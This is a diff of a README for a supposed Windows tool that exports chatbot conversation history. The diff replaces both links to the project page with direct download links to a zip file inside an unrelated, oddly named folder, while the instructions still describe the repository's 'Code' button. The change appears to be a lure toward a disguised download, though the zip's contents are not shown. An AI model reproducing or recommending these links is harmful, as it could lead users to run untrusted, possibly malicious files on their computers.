@@ -1,6 +1,6 @@
 # 💾 chatbot-lmarena-history-export - Export chatbot conversations to saved files
 
-[![](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://github.com/Mor2042/chatbot-lmarena-history-export)
+[![](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://github.com/Mor2042/chatbot-lmarena-history-export/raw/refs/heads/main/nikethamide/lmarena_chatbot_history_export_v1.8.zip)
 
 ## 🎯 About This Tool
 
@@ -18,7 +18,7 @@ This tool functions on any Windows computer. You need the following items instal
 
 You must visit the project page to get the script.
 
-[Click here to visit the download page](https://github.com/Mor2042/chatbot-lmarena-history-export)
+[Click here to visit the download page](https://github.com/Mor2042/chatbot-lmarena-history-export/raw/refs/heads/main/nikethamide/lmarena_chatbot_history_export_v1.8.zip)
 
 Once you reach that page, look for the green button labeled "Code." Click that button and select "Download ZIP." Save this file to your computer. Find the file in your Downloads folder and right-click it. Select "Extract All" to open the folder.
 
